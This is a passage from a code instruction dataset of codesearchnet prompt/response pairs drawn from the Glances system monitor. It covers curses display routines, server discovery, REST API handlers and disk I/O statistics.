3:\n                    plugin_display_optional[p] = False\n                    plugin_widths[p] = self.get_stats_display_width(stat_display[p], without_option=True) if hasattr(self.args, 'disable_' + p) else 0\n                    stats_width = sum(itervalues(plugin_widths)) + 1\n                    self.space_between_column = max(1, int((self.screen.getmaxyx()[1] - stats_width) / (stats_number - 1)))\n        else:\n            self.space_between_column = 0\n\n        # Display CPU, MEM, SWAP and LOAD\n        for p in self._top:\n            if p == 'quicklook':\n                continue\n            if p in stat_display:\n                self.display_plugin(stat_display[p],\n                                    display_optional=plugin_display_optional[p])\n            if p is not 'load':\n                # Skip last column\n                self.new_column()\n\n        # Space between column\n        self.space_between_column = 3\n\n        # Backup line position\n        self.saved_line = self.next_line"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndisplay the left sidebar in the Curses interface.", "response": "def __display_left(self, stat_display):\n        \"\"\"Display the left sidebar in the Curses interface.\"\"\"\n        self.init_column()\n\n        if self.args.disable_left_sidebar:\n            return\n\n        for s in self._left_sidebar:\n            if ((hasattr(self.args, 'enable_' + s) or\n                 hasattr(self.args, 'disable_' + s)) and s in stat_display):\n                self.new_line()\n                self.display_plugin(stat_display[s])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndisplay the right sidebar in the Curses interface.", "response": "def __display_right(self, stat_display):\n        \"\"\"Display the right sidebar in the Curses interface.\n\n        docker + processcount + amps + processlist + alert\n        \"\"\"\n        # Do not display anything if space is not available...\n        if self.screen.getmaxyx()[1] < self._left_sidebar_min_width:\n            return\n\n        # Restore line position\n        self.next_line = self.saved_line\n\n        # Display right sidebar\n        self.new_column()\n        for p in self._right_sidebar:\n            if p not in p:\n                # Catch for issue #1470\n                continue\n            self.new_line()\n            if p == 'processlist':\n                self.display_plugin(stat_display['processlist'],\n                                    display_optional=(self.screen.getmaxyx()[1] > 102),\n                                    display_additional=(not MACOS),\n                                    max_y=(self.screen.getmaxyx()[0] - self.get_stats_display_height(stat_display['alert']) - 2))\n            else:\n                self.display_plugin(stat_display[p])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndisplay a popup with the given message.", "response": "def display_popup(self, message,\n                      size_x=None, size_y=None,\n                      duration=3,\n                      is_input=False,\n                      input_size=30,\n                      input_value=None):\n        \"\"\"\n        Display a centered popup.\n\n        If is_input is False:\n         Display a centered popup with the given message during duration seconds\n         If size_x and size_y: set the popup size\n         else set it automatically\n         Return True if the popup could be displayed\n\n        If is_input is True:\n         Display a centered popup with the given message and a input field\n         If size_x and size_y: set the popup size\n         else set it automatically\n         Return the input string or None if the field is empty\n        \"\"\"\n        # Center the popup\n        sentence_list = message.split('\\n')\n        if size_x is None:\n            size_x = len(max(sentence_list, key=len)) + 4\n            # Add space for the input field\n            if is_input:\n                size_x += input_size\n        if size_y is None:\n            size_y = len(sentence_list) + 4\n        screen_x = self.screen.getmaxyx()[1]\n        screen_y = self.screen.getmaxyx()[0]\n        if size_x > screen_x or size_y > screen_y:\n            # No size to display the popup => abord\n            return False\n        pos_x = int((screen_x - size_x) / 2)\n        pos_y = int((screen_y - size_y) / 2)\n\n        # Create the popup\n        popup = curses.newwin(size_y, size_x, pos_y, pos_x)\n\n        # Fill the popup\n        popup.border()\n\n        # Add the message\n        for y, m in enumerate(message.split('\\n')):\n            popup.addnstr(2 + y, 2, m, len(m))\n\n        if is_input and not WINDOWS:\n            # Create a subwindow for the text field\n            subpop = popup.derwin(1, input_size, 2, 2 + len(m))\n            subpop.attron(self.colors_list['FILTER'])\n            # Init the field with the current value\n            if input_value is not None:\n                subpop.addnstr(0, 0, input_value, len(input_value))\n            # Display the popup\n            popup.refresh()\n            subpop.refresh()\n            # Create the textbox inside the subwindows\n            self.set_cursor(2)\n            self.term_window.keypad(1)\n            textbox = GlancesTextbox(subpop, insert_mode=False)\n            textbox.edit()\n            self.set_cursor(0)\n            self.term_window.keypad(0)\n            if textbox.gather() != '':\n                logger.debug(\n                    \"User enters the following string: %s\" % textbox.gather())\n                return textbox.gather()[:-1]\n            else:\n                logger.debug(\"User centers an empty string\")\n                return None\n        else:\n            # Display the popup\n            popup.refresh()\n            self.wait(duration * 1000)\n            return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndisplaying the plugin_stats on the screen.", "response": "def display_plugin(self, plugin_stats,\n                       display_optional=True,\n                       display_additional=True,\n                       max_y=65535,\n                       add_space=0):\n        \"\"\"Display the plugin_stats on the screen.\n\n        If display_optional=True display the optional stats\n        If display_additional=True display additionnal stats\n        max_y: do not display line > max_y\n        add_space: add x space (line) after the plugin\n        \"\"\"\n        # Exit if:\n        # - the plugin_stats message is empty\n        # - the display tag = False\n        if plugin_stats is None or not plugin_stats['msgdict'] or not plugin_stats['display']:\n            # Exit\n            return 0\n\n        # Get the screen size\n        screen_x = self.screen.getmaxyx()[1]\n        screen_y = self.screen.getmaxyx()[0]\n\n        # Set the upper/left position of the message\n        if plugin_stats['align'] == 'right':\n            # Right align (last column)\n            display_x = screen_x - self.get_stats_display_width(plugin_stats)\n        else:\n            display_x = self.column\n        if plugin_stats['align'] == 'bottom':\n            # Bottom (last line)\n            display_y = screen_y - self.get_stats_display_height(plugin_stats)\n        else:\n            display_y = self.line\n\n        # Display\n        x = display_x\n        x_max = x\n        y = display_y\n        for m in plugin_stats['msgdict']:\n            # New line\n            if m['msg'].startswith('\\n'):\n                # Go to the next line\n                y += 1\n                # Return to the first column\n                x = display_x\n                continue\n            # Do not display outside the screen\n            if x < 0:\n                continue\n            if not m['splittable'] and (x + len(m['msg']) > screen_x):\n                continue\n            if y < 0 or (y + 1 > screen_y) or (y > max_y):\n                break\n            # If display_optional = False do not display optional stats\n            if not display_optional and m['optional']:\n                continue\n            # If display_additional = False do not display additional stats\n            if not display_additional and m['additional']:\n                continue\n            # Is it possible to display the stat with the current screen size\n            # !!! Crach if not try/except... Why ???\n            try:\n                self.term_window.addnstr(y, x,\n                                         m['msg'],\n                                         # Do not disply outside the screen\n                                         screen_x - x,\n                                         self.colors_list[m['decoration']])\n            except Exception:\n                pass\n            else:\n                # New column\n                # Python 2: we need to decode to get real screen size because\n                # UTF-8 special tree chars occupy several bytes.\n                # Python 3: strings are strings and bytes are bytes, all is\n                # good.\n                try:\n                    x += len(u(m['msg']))\n                except UnicodeDecodeError:\n                    # Quick and dirty hack for issue #745\n                    pass\n                if x > x_max:\n                    x_max = x\n\n        # Compute the next Glances column/line position\n        self.next_column = max(\n            self.next_column, x_max + self.space_between_column)\n        self.next_line = max(self.next_line, y + self.space_between_line)\n\n        # Have empty lines after the plugins\n        self.next_line += add_space"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef flush(self, stats, cs_status=None):\n        self.erase()\n        self.display(stats, cs_status=cs_status)", "response": "Clear and update the screen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the screen. INPUT stats: Stats database to display duration: duration of the loop cs_status: \"None\": standalone or server mode \"Connected\": Client is connected to the server \"Disconnected\": Client is disconnected from the server return_to_browser: True: Do not exist, return to the browser list False: Exit and return to the shell OUTPUT True: Exit key has been pressed False: Others cases...", "response": "def update(self,\n               stats,\n               duration=3,\n               cs_status=None,\n               return_to_browser=False):\n        \"\"\"Update the screen.\n\n        INPUT\n        stats: Stats database to display\n        duration: duration of the loop\n        cs_status:\n            \"None\": standalone or server mode\n            \"Connected\": Client is connected to the server\n            \"Disconnected\": Client is disconnected from the server\n        return_to_browser:\n            True: Do not exist, return to the browser list\n            False: Exit and return to the shell\n\n        OUTPUT\n        True: Exit key has been pressed\n        False: Others cases...\n        \"\"\"\n        # Flush display\n        self.flush(stats, cs_status=cs_status)\n\n        # If the duration is < 0 (update + export time > refresh_time)\n        # Then display the interface and log a message\n        if duration <= 0:\n            logger.warning('Update and export time higher than refresh_time.')\n            duration = 0.1\n\n        # Wait duration (in s) time\n        exitkey = False\n        countdown = Timer(duration)\n        # Set the default timeout (in ms) for the getch method\n        self.term_window.timeout(int(duration * 1000))\n        while not countdown.finished() and not exitkey:\n            # Getkey\n            pressedkey = self.__catch_key(return_to_browser=return_to_browser)\n            # Is it an exit key ?\n            exitkey = (pressedkey == ord('\\x1b') or pressedkey == ord('q'))\n            if not exitkey and pressedkey > -1:\n                # Redraw display\n                self.flush(stats, cs_status=cs_status)\n                # Overwrite the timeout with the countdown\n                self.term_window.timeout(int(countdown.get() * 1000))\n\n        return exitkey"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the width of the formatted curses message.", "response": "def get_stats_display_width(self, curse_msg, without_option=False):\n        \"\"\"Return the width of the formatted curses message.\"\"\"\n        try:\n            if without_option:\n                # Size without options\n                c = len(max(''.join([(u(u(nativestr(i['msg'])).encode('ascii', 'replace')) if not i['optional'] else \"\")\n                                     for i in curse_msg['msgdict']]).split('\\n'), key=len))\n            else:\n                # Size with all options\n                c = len(max(''.join([u(u(nativestr(i['msg'])).encode('ascii', 'replace'))\n                                     for i in curse_msg['msgdict']]).split('\\n'), key=len))\n        except Exception as e:\n            logger.debug('ERROR: Can not compute plugin width ({})'.format(e))\n            return 0\n        else:\n            return c"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_stats_display_height(self, curse_msg):\n        try:\n            c = [i['msg'] for i in curse_msg['msgdict']].count('\\n')\n        except Exception as e:\n            logger.debug('ERROR: Can not compute plugin height ({})'.format(e))\n            return 0\n        else:\n            return c + 1", "response": "r Return the height of the formatted curses message."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getbulk_by_oid(self, non_repeaters, max_repetitions, *oid):\n        if self.version.startswith('3'):\n            errorIndication, errorStatus, errorIndex, varBinds = self.cmdGen.getCmd(\n                cmdgen.UsmUserData(self.user, self.auth),\n                cmdgen.UdpTransportTarget((self.host, self.port)),\n                non_repeaters,\n                max_repetitions,\n                *oid\n            )\n        if self.version.startswith('2'):\n            errorIndication, errorStatus, errorIndex, varBindTable = self.cmdGen.bulkCmd(\n                cmdgen.CommunityData(self.community),\n                cmdgen.UdpTransportTarget((self.host, self.port)),\n                non_repeaters,\n                max_repetitions,\n                *oid\n            )\n        else:\n            # Bulk request are not available with SNMP version 1\n            return []\n        return self.__bulk_result__(errorIndication, errorStatus, errorIndex, varBindTable)", "response": "This method returns a list of dicts that are available for SNMP."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load(self, config):\n        server_list = []\n\n        if config is None:\n            logger.debug(\"No configuration file available. Cannot load server list.\")\n        elif not config.has_section(self._section):\n            logger.warning(\"No [%s] section in the configuration file. Cannot load server list.\" % self._section)\n        else:\n            logger.info(\"Start reading the [%s] section in the configuration file\" % self._section)\n            for i in range(1, 256):\n                new_server = {}\n                postfix = 'server_%s_' % str(i)\n                # Read the server name (mandatory)\n                for s in ['name', 'port', 'alias']:\n                    new_server[s] = config.get_value(self._section, '%s%s' % (postfix, s))\n                if new_server['name'] is not None:\n                    # Manage optionnal information\n                    if new_server['port'] is None:\n                        new_server['port'] = '61209'\n                    new_server['username'] = 'glances'\n                    # By default, try empty (aka no) password\n                    new_server['password'] = ''\n                    try:\n                        new_server['ip'] = gethostbyname(new_server['name'])\n                    except gaierror as e:\n                        logger.error(\"Cannot get IP address for server %s (%s)\" % (new_server['name'], e))\n                        continue\n                    new_server['key'] = new_server['name'] + ':' + new_server['port']\n\n                    # Default status is 'UNKNOWN'\n                    new_server['status'] = 'UNKNOWN'\n\n                    # Server type is 'STATIC'\n                    new_server['type'] = 'STATIC'\n\n                    # Add the server to the list\n                    logger.debug(\"Add server %s to the static list\" % new_server['name'])\n                    server_list.append(new_server)\n\n            # Server list loaded\n            logger.info(\"%s server(s) loaded from the configuration file\" % len(server_list))\n            logger.debug(\"Static server list: %s\" % server_list)\n\n        return server_list", "response": "Load the server list from the configuration file."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_server(self, server_pos, key, value):\n        self._server_list[server_pos][key] = value", "response": "Set the key to the value for the server_pos."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_server(self, name, ip, port):\n        new_server = {\n            'key': name,  # Zeroconf name with both hostname and port\n            'name': name.split(':')[0],  # Short name\n            'ip': ip,  # IP address seen by the client\n            'port': port,  # TCP port\n            'username': 'glances',  # Default username\n            'password': '',  # Default password\n            'status': 'UNKNOWN',  # Server status: 'UNKNOWN', 'OFFLINE', 'ONLINE', 'PROTECTED'\n            'type': 'DYNAMIC'}  # Server type: 'STATIC' or 'DYNAMIC'\n        self._server_list.append(new_server)\n        logger.debug(\"Updated servers list (%s servers): %s\" %\n                     (len(self._server_list), self._server_list))", "response": "Add a new server to the list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nremove a server from the dict.", "response": "def remove_server(self, name):\n        \"\"\"Remove a server from the dict.\"\"\"\n        for i in self._server_list:\n            if i['key'] == name:\n                try:\n                    self._server_list.remove(i)\n                    logger.debug(\"Remove server %s from the list\" % name)\n                    logger.debug(\"Updated servers list (%s servers): %s\" % (\n                        len(self._server_list), self._server_list))\n                except ValueError:\n                    logger.error(\n                        \"Cannot remove server %s from the list\" % name)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the key to the value for the server_pos.", "response": "def set_server(self, server_pos, key, value):\n        \"\"\"Set the key to the value for the server_pos (position in the list).\"\"\"\n        self.servers.set_server(server_pos, key, value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_service(self, zeroconf, srv_type, srv_name):\n        if srv_type != zeroconf_type:\n            return False\n        logger.debug(\"Check new Zeroconf server: %s / %s\" %\n                     (srv_type, srv_name))\n        info = zeroconf.get_service_info(srv_type, srv_name)\n        if info:\n            new_server_ip = socket.inet_ntoa(info.address)\n            new_server_port = info.port\n\n            # Add server to the global dict\n            self.servers.add_server(srv_name, new_server_ip, new_server_port)\n            logger.info(\"New Glances server detected (%s from %s:%s)\" %\n                        (srv_name, new_server_ip, new_server_port))\n        else:\n            logger.warning(\n                \"New Glances server detected, but Zeroconf info failed to be grabbed\")\n        return True", "response": "Method called when a new Zeroconf client is detected."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nremove the server from the list.", "response": "def remove_service(self, zeroconf, srv_type, srv_name):\n        \"\"\"Remove the server from the list.\"\"\"\n        self.servers.remove_server(srv_name)\n        logger.info(\n            \"Glances server %s removed from the autodetect list\" % srv_name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the key to the value for the server_pos.", "response": "def set_server(self, server_pos, key, value):\n        \"\"\"Set the key to the value for the server_pos (position in the list).\"\"\"\n        if zeroconf_tag and self.zeroconf_enable_tag:\n            self.listener.set_server(server_pos, key, value)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ntry to find the active IP addresses.", "response": "def find_active_ip_address():\n        \"\"\"Try to find the active IP addresses.\"\"\"\n        import netifaces\n        # Interface of the default gateway\n        gateway_itf = netifaces.gateways()['default'][netifaces.AF_INET][1]\n        # IP address for the interface\n        return netifaces.ifaddresses(gateway_itf)[netifaces.AF_INET][0]['addr']"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncompresses a function and return the compressed result.", "response": "def compress(func):\n    \"\"\"Compress result with deflate algorithm if the client ask for it.\"\"\"\n    def wrapper(*args, **kwargs):\n        \"\"\"Wrapper that take one function and return the compressed result.\"\"\"\n        ret = func(*args, **kwargs)\n        logger.debug('Receive {} {} request with header: {}'.format(\n            request.method,\n            request.url,\n            ['{}: {}'.format(h, request.headers.get(h)) for h in request.headers.keys()]\n        ))\n        if 'deflate' in request.headers.get('Accept-Encoding', ''):\n            response.headers['Content-Encoding'] = 'deflate'\n            ret = deflate_compress(ret)\n        else:\n            response.headers['Content-Encoding'] = 'identity'\n        return ret\n\n    def deflate_compress(data, compress_level=6):\n        \"\"\"Compress given data using the DEFLATE algorithm\"\"\"\n        # Init compression\n        zobj = zlib.compressobj(compress_level,\n                                zlib.DEFLATED,\n                                zlib.MAX_WBITS,\n                                zlib.DEF_MEM_LEVEL,\n                                zlib.Z_DEFAULT_STRATEGY)\n\n        # Return compressed object\n        return zobj.compress(b(data)) + zobj.flush()\n\n    return wrapper"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads the outputs section of the configuration file.", "response": "def load_config(self, config):\n        \"\"\"Load the outputs section of the configuration file.\"\"\"\n        # Limit the number of processes to display in the WebUI\n        if config is not None and config.has_section('outputs'):\n            logger.debug('Read number of processes to display in the WebUI')\n            n = config.get_value('outputs', 'max_processes_display', default=None)\n            logger.debug('Number of processes to display in the WebUI: {}'.format(n))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncheck if a username and password combination is valid.", "response": "def check_auth(self, username, password):\n        \"\"\"Check if a username/password combination is valid.\"\"\"\n        if username == self.args.username:\n            from glances.password import GlancesPassword\n            pwd = GlancesPassword()\n            return pwd.check_password(self.args.password, pwd.sha256_hash(password))\n        else:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _index(self, refresh_time=None):\n\n        if refresh_time is None or refresh_time < 1:\n            refresh_time = self.args.time\n\n        # Update the stat\n        self.__update__()\n\n        # Display\n        return template(\"index.html\", refresh_time=refresh_time)", "response": "Bottle callback for index. html ( / ) file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _api_help(self):\n        response.content_type = 'application/json; charset=utf-8'\n\n        # Update the stat\n        view_data = self.stats.get_plugin(\"help\").get_view_data()\n        try:\n            plist = json.dumps(view_data, sort_keys=True)\n        except Exception as e:\n            abort(404, \"Cannot get help view data (%s)\" % str(e))\n        return plist", "response": "Glances API RESTful implementation."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _api_plugins(self):\n        response.content_type = 'application/json; charset=utf-8'\n\n        # Update the stat\n        self.__update__()\n\n        try:\n            plist = json.dumps(self.plugins_list)\n        except Exception as e:\n            abort(404, \"Cannot get plugin list (%s)\" % str(e))\n        return plist", "response": "Glances API RESTFul implementation."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nglancing API RESTful implementation.", "response": "def _api_all(self):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of all the plugins\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if self.args.debug:\n            fname = os.path.join(tempfile.gettempdir(), 'glances-debug.json')\n            try:\n                with open(fname) as f:\n                    return f.read()\n            except IOError:\n                logger.debug(\"Debug file (%s) not found\" % fname)\n\n        # Update the stat\n        self.__update__()\n\n        try:\n            # Get the JSON value of the stat ID\n            statval = json.dumps(self.stats.getAllAsDict())\n        except Exception as e:\n            abort(404, \"Cannot get stats (%s)\" % str(e))\n\n        return statval"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nglancing API RESTful implementation.", "response": "def _api_all_limits(self):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of all the plugins limits\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        try:\n            # Get the JSON value of the stat limits\n            limits = json.dumps(self.stats.getAllLimitsAsDict())\n        except Exception as e:\n            abort(404, \"Cannot get limits (%s)\" % (str(e)))\n        return limits"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _api_all_views(self):\n        response.content_type = 'application/json; charset=utf-8'\n\n        try:\n            # Get the JSON value of the stat view\n            limits = json.dumps(self.stats.getAllViewsAsDict())\n        except Exception as e:\n            abort(404, \"Cannot get views (%s)\" % (str(e)))\n        return limits", "response": "Glances API RESTful implementation."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nglance API RESTful implementation.", "response": "def _api(self, plugin):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of a given plugin\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if plugin not in self.plugins_list:\n            abort(400, \"Unknown plugin %s (available plugins: %s)\" % (plugin, self.plugins_list))\n\n        # Update the stat\n        self.__update__()\n\n        try:\n            # Get the JSON value of the stat ID\n            statval = self.stats.get_plugin(plugin).get_stats()\n        except Exception as e:\n            abort(404, \"Cannot get plugin %s (%s)\" % (plugin, str(e)))\n        return statval"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nglancing API RESTful implementation.", "response": "def _api_history(self, plugin, nb=0):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of a given plugin history\n        Limit to the last nb items (all if nb=0)\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if plugin not in self.plugins_list:\n            abort(400, \"Unknown plugin %s (available plugins: %s)\" % (plugin, self.plugins_list))\n\n        # Update the stat\n        self.__update__()\n\n        try:\n            # Get the JSON value of the stat ID\n            statval = self.stats.get_plugin(plugin).get_stats_history(nb=int(nb))\n        except Exception as e:\n            abort(404, \"Cannot get plugin history %s (%s)\" % (plugin, str(e)))\n        return statval"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nglances API RESTful implementation.", "response": "def _api_limits(self, plugin):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON limits of a given plugin\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if plugin not in self.plugins_list:\n            abort(400, \"Unknown plugin %s (available plugins: %s)\" % (plugin, self.plugins_list))\n\n        # Update the stat\n        # self.__update__()\n\n        try:\n            # Get the JSON value of the stat limits\n            ret = self.stats.get_plugin(plugin).limits\n        except Exception as e:\n            abort(404, \"Cannot get limits for plugin %s (%s)\" % (plugin, str(e)))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nglances API RESTful implementation.", "response": "def _api_views(self, plugin):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON views of a given plugin\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if plugin not in self.plugins_list:\n            abort(400, \"Unknown plugin %s (available plugins: %s)\" % (plugin, self.plugins_list))\n\n        # Update the stat\n        # self.__update__()\n\n        try:\n            # Get the JSON value of the stat views\n            ret = self.stats.get_plugin(plugin).get_views()\n        except Exception as e:\n            abort(404, \"Cannot get views for plugin %s (%s)\" % (plugin, str(e)))\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _api_itemvalue(self, plugin, item, value=None, history=False, nb=0):\n        response.content_type = 'application/json; charset=utf-8'\n\n        if plugin not in self.plugins_list:\n            abort(400, \"Unknown plugin %s (available plugins: %s)\" % (plugin, self.plugins_list))\n\n        # Update the stat\n        self.__update__()\n\n        if value is None:\n            if history:\n                ret = self.stats.get_plugin(plugin).get_stats_history(item, nb=int(nb))\n            else:\n                ret = self.stats.get_plugin(plugin).get_stats_item(item)\n\n            if ret is None:\n                abort(404, \"Cannot get item %s%s in plugin %s\" % (item, 'history ' if history else '', plugin))\n        else:\n            if history:\n                # Not available\n                ret = None\n            else:\n                ret = self.stats.get_plugin(plugin).get_stats_value(item, value)\n\n            if ret is None:\n                abort(404, \"Cannot get item %s(%s=%s) in plugin %s\" % ('history ' if history else '', item, value, plugin))\n\n        return ret", "response": "Father method for _api_item and _api_value."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _api_item_history(self, plugin, item, nb=0):\n        return self._api_itemvalue(plugin, item, history=True, nb=int(nb))", "response": "Glances API RESTful implementation."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nglances API RESTful implementation.", "response": "def _api_value(self, plugin, item, value):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the process stats (dict) for the given item=value\n        HTTP/200 if OK\n        HTTP/400 if plugin is not found\n        HTTP/404 if others error\n        \"\"\"\n        return self._api_itemvalue(plugin, item, value)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nglance API RESTful implementation.", "response": "def _api_config(self):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of the Glances configuration file\n        HTTP/200 if OK\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        try:\n            # Get the JSON value of the config' dict\n            args_json = json.dumps(self.config.as_dict())\n        except Exception as e:\n            abort(404, \"Cannot get config (%s)\" % str(e))\n        return args_json"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _api_config_item(self, item):\n        response.content_type = 'application/json; charset=utf-8'\n\n        config_dict = self.config.as_dict()\n        if item not in config_dict:\n            abort(400, \"Unknown configuration item %s\" % item)\n\n        try:\n            # Get the JSON value of the config' dict\n            args_json = json.dumps(config_dict[item])\n        except Exception as e:\n            abort(404, \"Cannot get config item (%s)\" % str(e))\n        return args_json", "response": "Glances API RESTful implementation."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _api_args(self):\n        response.content_type = 'application/json; charset=utf-8'\n\n        try:\n            # Get the JSON value of the args' dict\n            # Use vars to convert namespace to dict\n            # Source: https://docs.python.org/%s/library/functions.html#vars\n            args_json = json.dumps(vars(self.args))\n        except Exception as e:\n            abort(404, \"Cannot get args (%s)\" % str(e))\n        return args_json", "response": "Returns the JSON representation of the Glances command line arguments"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nglances API RESTful implementation.", "response": "def _api_args_item(self, item):\n        \"\"\"Glances API RESTful implementation.\n\n        Return the JSON representation of the Glances command line arguments item\n        HTTP/200 if OK\n        HTTP/400 if item is not found\n        HTTP/404 if others error\n        \"\"\"\n        response.content_type = 'application/json; charset=utf-8'\n\n        if item not in self.args:\n            abort(400, \"Unknown argument item %s\" % item)\n\n        try:\n            # Get the JSON value of the args' dict\n            # Use vars to convert namespace to dict\n            # Source: https://docs.python.org/%s/library/functions.html#vars\n            args_json = json.dumps(vars(self.args)[item])\n        except Exception as e:\n            abort(404, \"Cannot get args item (%s)\" % str(e))\n        return args_json"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the disk I/O stats using the input method.", "response": "def update(self):\n        \"\"\"Update disk I/O stats using the input method.\"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            # Grab the stat using the psutil disk_io_counters method\n            # read_count: number of reads\n            # write_count: number of writes\n            # read_bytes: number of bytes read\n            # write_bytes: number of bytes written\n            # read_time: time spent reading from disk (in milliseconds)\n            # write_time: time spent writing to disk (in milliseconds)\n            try:\n                diskiocounters = psutil.disk_io_counters(perdisk=True)\n            except Exception:\n                return stats\n\n            # Previous disk IO stats are stored in the diskio_old variable\n            if not hasattr(self, 'diskio_old'):\n                # First call, we init the diskio_old var\n                try:\n                    self.diskio_old = diskiocounters\n                except (IOError, UnboundLocalError):\n                    pass\n            else:\n                # By storing time data we enable Rx/s and Tx/s calculations in the\n                # XML/RPC API, which would otherwise be overly difficult work\n                # for users of the API\n                time_since_update = getTimeSinceLastUpdate('disk')\n\n                diskio_new = diskiocounters\n                for disk in diskio_new:\n                    # By default, RamFS is not displayed (issue #714)\n                    if self.args is not None and not self.args.diskio_show_ramfs and disk.startswith('ram'):\n                        continue\n\n                    # Do not take hide disk into account\n                    if self.is_hide(disk):\n                        continue\n\n                    # Compute count and bit rate\n                    try:\n                        read_count = (diskio_new[disk].read_count -\n                                      self.diskio_old[disk].read_count)\n                        write_count = (diskio_new[disk].write_count -\n                                       self.diskio_old[disk].write_count)\n                        read_bytes = (diskio_new[disk].read_bytes -\n                                      self.diskio_old[disk].read_bytes)\n                        write_bytes = (diskio_new[disk].write_bytes -\n                                       self.diskio_old[disk].write_bytes)\n                        diskstat = {\n                            'time_since_update': time_since_update,\n                            'disk_name': n(disk),\n                            'read_count': read_count,\n                            'write_count': write_count,\n                            'read_bytes': read_bytes,\n                            'write_bytes': write_bytes}\n                        # Add alias if exist (define in the configuration file)\n                        if self.has_alias(disk) is not None:\n                            diskstat['alias'] = self.has_alias(disk)\n                    except KeyError:\n                        continue\n                    else:\n                        diskstat['key'] = self.get_key()\n                        stats.append(diskstat)\n\n                # Save stats to compute next bitrate\n                self.diskio_old = diskio_new\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n            # No standard way for the moment...\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
